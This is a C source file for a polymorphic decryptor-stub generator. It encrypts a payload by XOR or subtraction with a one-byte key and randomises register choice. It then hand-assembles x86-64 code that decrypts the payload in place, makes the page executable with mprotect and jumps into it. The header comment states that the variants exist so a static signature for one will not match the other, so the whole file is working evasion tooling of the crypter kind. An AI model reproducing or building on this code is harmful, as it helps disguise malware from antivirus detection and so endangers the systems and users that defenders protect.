#include "api.h"

/*
 * regeneration_engine — polymorphic decryptor-stub generator.
 *
 * Consumes a plaintext payload and emits a self-decrypting x86-64 stub
 * that restores the payload to plaintext in place and transfers control
 * to it. The generated stub is written to output.bin in the trailer
 * format consumed by elf_warp (magic + placeholder offsets + length).
 *
 * Two transformation modes are selected at random per run:
 *
 *   XOR  — ciphertext byte ^= key
 *   SUB  — ciphertext byte -= key  (stub decodes by subtracting)
 *
 * Each mode emits a distinct decode primitive (0x30 vs 0x28) and a
 * distinct pre-loop zeroing idiom (0x31 vs 0x29), so a static signature
 * matching one variant will not match the other.
 *
 * The stub uses a single-byte key: keystream_alloc() returns a
 * size_of_payload-byte buffer for mlock/wipe hygiene, but only
 * encryption_key[0] is mixed into the ciphertext, matching the stub's
 * one-byte keystream register.
 *
 * Register roles in the generated stub are assigned by a Fisher-Yates
 * shuffle of the caller-saved pool (RAX, RCX, RDX, RBX, RSI, RDI,
 * R8-R15):
 *
 *   cursor    — base of the encrypted payload, established by LEA
 *   iterator  — byte counter, decremented to zero
 *   keystream — key byte, held in the low 8 bits
 *
 * The epilogue calls SYS_mprotect on the ciphertext page to PROT_READ |
 * PROT_EXEC, then jumps to the decrypted payload. Three 64-bit
 * placeholders are patched by elf_warp after segment layout.
 *
 * Padding note: before emitting the trailer, the buffer is padded with
 * NOPs until (current_size + 40) is page-aligned. This forces elf_warp's
 * ct_va = BASE + stub_len + 40 onto a fresh page, so the ciphertext
 * PT_LOAD does not share a page with the stub PT_LOAD — otherwise the
 * loader's second mmap silently replaces the first page's permissions
 * and the process faults on entry.
 */
void regeneration_engine(uint8_t *payload, uint64_t size_of_payload)
{
    stub stub_generation;
    stub_generation.capacity = CAPACITY;
    stub_generation.current_size = 0;
    stub_generation.buffer = malloc(stub_generation.capacity);
    if (!stub_generation.buffer)
    {
        fprintf(stderr, "Error occured in mem allocation\n");
        goto cleanup;
    }

    uint8_t *encryption_key = NULL;
    encryption_key = keystream_alloc(size_of_payload);
    if (!encryption_key)
    {
        fprintf(stderr, "Error occured in generating encryption keys\n");
        goto cleanup;
    }

    /* Single-byte key matching the stub's one-byte keystream register. */
    uint8_t single_key = encryption_key[0];

    /* --- Register-role assignment ----------------------------------- */
    srand((uint32_t)time(NULL));
    Reg pointer_reg, counter_reg, key_reg;
    Reg array[] = {
        RAX,
        RCX,
        RDX,
        RBX,
        RSI,
        RDI,
        R8,
        R9,
        R10,
        R11,
        R12,
        R13,
        R14,
        R15,
    };
    uint64_t size_of_array = sizeof(array) / sizeof(array[0]);

    /* Fisher-Yates: uniform permutation, no bias, no repeats. */
    for (int32_t i = (int32_t)size_of_array - 1; i > 0; i--)
    {
        int32_t j = rand() % (i + 1);

        int32_t temp = array[i];
        array[i] = array[j];
        array[j] = temp;
    }
    pointer_reg = array[0];
    counter_reg = array[1];
    key_reg = array[2];

    /* --- Mode selection --------------------------------------------- */
    int32_t random_choice = rand();

    /* Per-branch state recorded for the shared epilogue/trailer/LEA tail. */
    uint64_t placeholder_offset = 0;
    uint64_t epi_addr_off = 0, epi_len_off = 0, epi_jmp_off = 0;

    if (random_choice % 2 == 0)
    {
        /* ================================================================
         * XOR variant
         * ================================================================ */
        uint8_t *temp_payload_buffer = malloc(size_of_payload);
        if (!temp_payload_buffer)
        {
            goto cleanup;
        }
        memcpy(temp_payload_buffer, payload, size_of_payload);

        /* Ciphertext: each byte XORed with the same key byte. */
        for (uint64_t byte = 0; byte < size_of_payload; byte++)
        {
            temp_payload_buffer[byte] ^= single_key;
        }

        /* LEA cursor, [RIP + disp32]. Displacement patched after layout. */
        uint8_t base_REX_byte = 0x48;
        uint8_t ModR_M_byte = 0x05 + (pointer_reg * 8);

        if (pointer_reg >= 8)
        {
            base_REX_byte += 0x4;
            ModR_M_byte = 0x05 + ((pointer_reg - 8) * 8);
        }
        single_byte_emitter(&stub_generation, base_REX_byte);
        single_byte_emitter(&stub_generation, 0x8D);
        single_byte_emitter(&stub_generation, ModR_M_byte);
        placeholder_offset = stub_generation.current_size;
        single_byte_emitter(&stub_generation, 0x00);
        single_byte_emitter(&stub_generation, 0x00);
        single_byte_emitter(&stub_generation, 0x00);
        single_byte_emitter(&stub_generation, 0x00);

        /* MOV keystream, imm64 = single_key. */
        base_REX_byte = 0x48 + (key_reg >= 8 ? 0x1 : 0x0);
        single_byte_emitter(&stub_generation, base_REX_byte);
        single_byte_emitter(&stub_generation, (uint8_t)(0xB8 + (key_reg & 0x7)));
        multi_byte_emitter(&stub_generation, (uintptr_t)single_key);

        /* XOR iterator, iterator. REX.R and REX.B both required. */
        base_REX_byte = 0x48;
        ModR_M_byte = 0xC0 + (counter_reg * 8) + counter_reg;
        if (counter_reg >= 8)
        {
            base_REX_byte += 0x1 + 0x4;
            ModR_M_byte = 0xC0 + ((counter_reg - 8) * 8) + (counter_reg - 8);
        }
        single_byte_emitter(&stub_generation, base_REX_byte);
        single_byte_emitter(&stub_generation, 0x31);
        single_byte_emitter(&stub_generation, ModR_M_byte);

        /* MOV iterator, imm64 = size_of_payload. */
        base_REX_byte = 0x48;
        uint8_t mov_reg_val = counter_reg;
        if (counter_reg >= 8)
        {
            base_REX_byte += 0x1;
            mov_reg_val = counter_reg - 8;
        }
        single_byte_emitter(&stub_generation, base_REX_byte);
        single_byte_emitter(&stub_generation, (uint8_t)(0xB8 + mov_reg_val));
        multi_byte_emitter(&stub_generation, (uintptr_t)size_of_payload);

        uint64_t loop_start = stub_generation.current_size;

        /* XOR byte ptr [cursor], keystream_low — 8-bit, no REX.W. */
        uint8_t xor_rex = 0x40;
        if (key_reg >= 8)
            xor_rex += 0x4;
        if (pointer_reg >= 8)
            xor_rex += 0x1;

        uint8_t clean_key = (key_reg >= 8) ? (key_reg - 8) : key_reg;
        uint8_t clean_ptr = (pointer_reg >= 8) ? (pointer_reg - 8) : pointer_reg;
        uint8_t xor_modrm = 0x00 + (clean_key * 8) + clean_ptr;

        if (xor_rex > 0x40)
        {
            single_byte_emitter(&stub_generation, xor_rex);
        }
        single_byte_emitter(&stub_generation, 0x30);
        single_byte_emitter(&stub_generation, xor_modrm);

        /* INC cursor. */
        uint8_t inc_rex = 0x48;
        if (pointer_reg >= 8)
            inc_rex += 0x1;
        uint8_t inc_modrm = 0xC0 + clean_ptr;

        single_byte_emitter(&stub_generation, inc_rex);
        single_byte_emitter(&stub_generation, 0xFF);
        single_byte_emitter(&stub_generation, inc_modrm);

        /* DEC iterator; JNZ rel8. */
        uint8_t dec_rex = 0x48;
        if (counter_reg >= 8)
            dec_rex += 0x1;
        uint8_t clean_ctr = (counter_reg >= 8) ? (counter_reg - 8) : counter_reg;
        uint8_t dec_modrm = 0xC8 + clean_ctr;

        single_byte_emitter(&stub_generation, dec_rex);
        single_byte_emitter(&stub_generation, 0xFF);
        single_byte_emitter(&stub_generation, dec_modrm);

        single_byte_emitter(&stub_generation, 0x75);
        int8_t distance = (int8_t)(loop_start - (stub_generation.current_size + 1));
        single_byte_emitter(&stub_generation, (uint8_t)distance);

        /* --- Epilogue: mprotect(ciphertext_page, len, R|X); jmp --- */

        /* mov rax, 10 (SYS_mprotect) — 4-byte immediate. */
        single_byte_emitter(&stub_generation, 0x48);
        single_byte_emitter(&stub_generation, 0xC7);
        single_byte_emitter(&stub_generation, 0xC0);
        single_byte_emitter(&stub_generation, 0x0A);
        single_byte_emitter(&stub_generation, 0x00);
        single_byte_emitter(&stub_generation, 0x00);
        single_byte_emitter(&stub_generation, 0x00);

        /* mov rdi, <page> — 8-byte placeholder, patched by elf_warp. */
        single_byte_emitter(&stub_generation, 0x48);
        single_byte_emitter(&stub_generation, 0xBF);
        epi_addr_off = stub_generation.current_size;
        multi_byte_emitter(&stub_generation, 0);

        /* mov rsi, <len> — 8-byte placeholder, patched by elf_warp. */
        single_byte_emitter(&stub_generation, 0x48);
        single_byte_emitter(&stub_generation, 0xBE);
        epi_len_off = stub_generation.current_size;
        multi_byte_emitter(&stub_generation, 0);

        /* mov rdx, 5 (PROT_READ | PROT_EXEC) — 4-byte immediate. */
        single_byte_emitter(&stub_generation, 0x48);
        single_byte_emitter(&stub_generation, 0xC7);
        single_byte_emitter(&stub_generation, 0xC2);
        single_byte_emitter(&stub_generation, 0x05);
        single_byte_emitter(&stub_generation, 0x00);
        single_byte_emitter(&stub_generation, 0x00);
        single_byte_emitter(&stub_generation, 0x00);

        /* syscall */
        single_byte_emitter(&stub_generation, 0x0F);
        single_byte_emitter(&stub_generation, 0x05);

        /* mov rax, <ct_va>; jmp rax — 8-byte placeholder. */
        single_byte_emitter(&stub_generation, 0x48);
        single_byte_emitter(&stub_generation, 0xB8);
        epi_jmp_off = stub_generation.current_size;
        multi_byte_emitter(&stub_generation, 0);

        single_byte_emitter(&stub_generation, 0xFF);
        single_byte_emitter(&stub_generation, 0xE0);

        /* --- Page-alignment padding ------------------------------
         * NOP-pad until (current_size + 40) is page-aligned. This
         * pushes elf_warp's ct_va = BASE + stub_len + 40 onto a fresh
         * page, so the ciphertext PT_LOAD does not share a page with
         * the stub PT_LOAD. Unreachable at runtime: the stub jmps to
         * ciphertext from the epilogue above, never falls through. */
        uint64_t pad_to_page = (0x1000 - ((stub_generation.current_size + 40) % 0x1000)) % 0x1000;
        for (uint64_t p = 0; p < pad_to_page; p++)
        {
            single_byte_emitter(&stub_generation, 0x90);
        }

        /* --- Trailer for elf_warp -------------------------------- */
        multi_byte_emitter(&stub_generation, (uintptr_t)0xDEADBEEFCAFEBABEULL);
        multi_byte_emitter(&stub_generation, (uintptr_t)epi_addr_off);
        multi_byte_emitter(&stub_generation, (uintptr_t)epi_len_off);
        multi_byte_emitter(&stub_generation, (uintptr_t)epi_jmp_off);
        multi_byte_emitter(&stub_generation, (uintptr_t)size_of_payload);

        /* Backfill the LEA displacement — current_size is ciphertext start. */
        uint32_t payload_offset = (uint32_t)(stub_generation.current_size - placeholder_offset - 4);
        memcpy(&stub_generation.buffer[placeholder_offset], &payload_offset, sizeof(uint32_t));

        /* Append ciphertext via the library emitters. */
        uint64_t full_chunks = size_of_payload / sizeof(uintptr_t);
        uint64_t tail = size_of_payload % sizeof(uintptr_t);
        for (uint64_t c = 0; c < full_chunks; c++)
        {
            uintptr_t chunk = 0;
            memcpy(&chunk, temp_payload_buffer + c * sizeof(uintptr_t), sizeof(uintptr_t));
            multi_byte_emitter(&stub_generation, chunk);
        }
        for (uint64_t r = 0; r < tail; r++)
        {
            single_byte_emitter(&stub_generation, temp_payload_buffer[full_chunks * sizeof(uintptr_t) + r]);
        }

        secure_bzero(temp_payload_buffer, size_of_payload);
        free(temp_payload_buffer);
    }
    else
    {
        /* ================================================================
         * SUB variant
         * ================================================================ */
        uint8_t *temp_payload_buffer = malloc(size_of_payload);
        if (!temp_payload_buffer)
        {
            goto cleanup;
        }
        memcpy(temp_payload_buffer, payload, size_of_payload);

        /* Ciphertext: each byte incremented by the same key byte. */
        for (uint64_t byte = 0; byte < size_of_payload; byte++)
        {
            temp_payload_buffer[byte] += single_key;
        }

        /* LEA cursor, [RIP + disp32]. */
        uint8_t base_REX_byte = 0x48;
        uint8_t ModR_M_byte = 0x05 + (pointer_reg * 8);

        if (pointer_reg >= 8)
        {
            base_REX_byte += 0x4;
            ModR_M_byte = 0x05 + ((pointer_reg - 8) * 8);
        }
        single_byte_emitter(&stub_generation, base_REX_byte);
        single_byte_emitter(&stub_generation, 0x8D);
        single_byte_emitter(&stub_generation, ModR_M_byte);
        placeholder_offset = stub_generation.current_size;
        single_byte_emitter(&stub_generation, 0x00);
        single_byte_emitter(&stub_generation, 0x00);
        single_byte_emitter(&stub_generation, 0x00);
        single_byte_emitter(&stub_generation, 0x00);

        /* MOV keystream, imm64 = single_key. */
        base_REX_byte = 0x48 + (key_reg >= 8 ? 0x1 : 0x0);
        single_byte_emitter(&stub_generation, base_REX_byte);
        single_byte_emitter(&stub_generation, (uint8_t)(0xB8 + (key_reg & 0x7)));
        multi_byte_emitter(&stub_generation, (uintptr_t)single_key);

        /* SUB iterator, iterator. */
        base_REX_byte = 0x48;
        ModR_M_byte = 0xC0 + (counter_reg * 8) + counter_reg;
        if (counter_reg >= 8)
        {
            base_REX_byte += 0x1 + 0x4;
            ModR_M_byte = 0xC0 + ((counter_reg - 8) * 8) + (counter_reg - 8);
        }
        single_byte_emitter(&stub_generation, base_REX_byte);
        single_byte_emitter(&stub_generation, 0x29);
        single_byte_emitter(&stub_generation, ModR_M_byte);

        /* MOV iterator, imm64 = size_of_payload. */
        base_REX_byte = 0x48;
        uint8_t mov_reg_val = counter_reg;
        if (counter_reg >= 8)
        {
            base_REX_byte += 0x1;
            mov_reg_val = counter_reg - 8;
        }
        single_byte_emitter(&stub_generation, base_REX_byte);
        single_byte_emitter(&stub_generation, (uint8_t)(0xB8 + mov_reg_val));
        multi_byte_emitter(&stub_generation, (uintptr_t)size_of_payload);

        uint64_t loop_start = stub_generation.current_size;

        /* SUB byte ptr [cursor], keystream_low — 8-bit, no REX.W. */
        uint8_t sub_rex = 0x40;
        if (key_reg >= 8)
            sub_rex += 0x4;
        if (pointer_reg >= 8)
            sub_rex += 0x1;

        uint8_t clean_key = (key_reg >= 8) ? (key_reg - 8) : key_reg;
        uint8_t clean_ptr = (pointer_reg >= 8) ? (pointer_reg - 8) : pointer_reg;
        uint8_t sub_modrm = 0x00 + (clean_key * 8) + clean_ptr;

        if (sub_rex > 0x40)
        {
            single_byte_emitter(&stub_generation, sub_rex);
        }
        single_byte_emitter(&stub_generation, 0x28);
        single_byte_emitter(&stub_generation, sub_modrm);

        /* INC cursor. */
        uint8_t inc_rex = 0x48;
        if (pointer_reg >= 8)
            inc_rex += 0x1;
        uint8_t inc_modrm = 0xC0 + clean_ptr;

        single_byte_emitter(&stub_generation, inc_rex);
        single_byte_emitter(&stub_generation, 0xFF);
        single_byte_emitter(&stub_generation, inc_modrm);

        /* DEC iterator; JNZ rel8. */
        uint8_t dec_rex = 0x48;
        if (counter_reg >= 8)
            dec_rex += 0x1;
        uint8_t clean_ctr = (counter_reg >= 8) ? (counter_reg - 8) : counter_reg;
        uint8_t dec_modrm = 0xC8 + clean_ctr;

        single_byte_emitter(&stub_generation, dec_rex);
        single_byte_emitter(&stub_generation, 0xFF);
        single_byte_emitter(&stub_generation, dec_modrm);

        single_byte_emitter(&stub_generation, 0x75);
        int8_t distance = (int8_t)(loop_start - (stub_generation.current_size + 1));
        single_byte_emitter(&stub_generation, (uint8_t)distance);

        /* --- Epilogue: mprotect(ciphertext_page, len, R|X); jmp --- */

        /* mov rax, 10 (SYS_mprotect). */
        single_byte_emitter(&stub_generation, 0x48);
        single_byte_emitter(&stub_generation, 0xC7);
        single_byte_emitter(&stub_generation, 0xC0);
        single_byte_emitter(&stub_generation, 0x0A);
        single_byte_emitter(&stub_generation, 0x00);
        single_byte_emitter(&stub_generation, 0x00);
        single_byte_emitter(&stub_generation, 0x00);

        /* mov rdi, <page>. */
        single_byte_emitter(&stub_generation, 0x48);
        single_byte_emitter(&stub_generation, 0xBF);
        epi_addr_off = stub_generation.current_size;
        multi_byte_emitter(&stub_generation, 0);

        /* mov rsi, <len>. */
        single_byte_emitter(&stub_generation, 0x48);
        single_byte_emitter(&stub_generation, 0xBE);
        epi_len_off = stub_generation.current_size;
        multi_byte_emitter(&stub_generation, 0);

        /* mov rdx, 5 (PROT_READ | PROT_EXEC). */
        single_byte_emitter(&stub_generation, 0x48);
        single_byte_emitter(&stub_generation, 0xC7);
        single_byte_emitter(&stub_generation, 0xC2);
        single_byte_emitter(&stub_generation, 0x05);
        single_byte_emitter(&stub_generation, 0x00);
        single_byte_emitter(&stub_generation, 0x00);
        single_byte_emitter(&stub_generation, 0x00);

        /* syscall */
        single_byte_emitter(&stub_generation, 0x0F);
        single_byte_emitter(&stub_generation, 0x05);

        /* mov rax, <ct_va>; jmp rax. */
        single_byte_emitter(&stub_generation, 0x48);
        single_byte_emitter(&stub_generation, 0xB8);
        epi_jmp_off = stub_generation.current_size;
        multi_byte_emitter(&stub_generation, 0);

        single_byte_emitter(&stub_generation, 0xFF);
        single_byte_emitter(&stub_generation, 0xE0);

        /* --- Page-alignment padding (see XOR branch) --------------- */
        uint64_t pad_to_page = (0x1000 - ((stub_generation.current_size + 40) % 0x1000)) % 0x1000;
        for (uint64_t p = 0; p < pad_to_page; p++)
        {
            single_byte_emitter(&stub_generation, 0x90);
        }

        /* --- Trailer for elf_warp -------------------------------- */
        multi_byte_emitter(&stub_generation, (uintptr_t)0xDEADBEEFCAFEBABEULL);
        multi_byte_emitter(&stub_generation, (uintptr_t)epi_addr_off);
        multi_byte_emitter(&stub_generation, (uintptr_t)epi_len_off);
        multi_byte_emitter(&stub_generation, (uintptr_t)epi_jmp_off);
        multi_byte_emitter(&stub_generation, (uintptr_t)size_of_payload);

        /* Backfill the LEA displacement. */
        uint32_t payload_offset = (uint32_t)(stub_generation.current_size - placeholder_offset - 4);
        memcpy(&stub_generation.buffer[placeholder_offset], &payload_offset, sizeof(uint32_t));

        /* Append ciphertext via the library emitters. */
        uint64_t full_chunks = size_of_payload / sizeof(uintptr_t);
        uint64_t tail = size_of_payload % sizeof(uintptr_t);
        for (uint64_t c = 0; c < full_chunks; c++)
        {
            uintptr_t chunk = 0;
            memcpy(&chunk, temp_payload_buffer + c * sizeof(uintptr_t), sizeof(uintptr_t));
            multi_byte_emitter(&stub_generation, chunk);
        }
        for (uint64_t r = 0; r < tail; r++)
        {
            single_byte_emitter(&stub_generation, temp_payload_buffer[full_chunks * sizeof(uintptr_t) + r]);
        }

        secure_bzero(temp_payload_buffer, size_of_payload);
        free(temp_payload_buffer);
    }

    /* --- Persist the generated stub ------------------------------- */
    FILE *out = fopen("output.bin", "wb");
    if (!out)
    {
        fprintf(stderr, "Error opening output.bin for writing\n");
        goto cleanup;
    }
    if (fwrite(stub_generation.buffer, 1, stub_generation.current_size, out)
            != stub_generation.current_size)
    {
        fprintf(stderr, "Short write to output.bin\n");
        fclose(out);
        goto cleanup;
    }
    fclose(out);

cleanup:
    if (encryption_key)
        keystream_free(encryption_key, size_of_payload);
    if (stub_generation.buffer)
    {
        secure_bzero(stub_generation.buffer, stub_generation.current_size);
        free(stub_generation.buffer);
    }
}
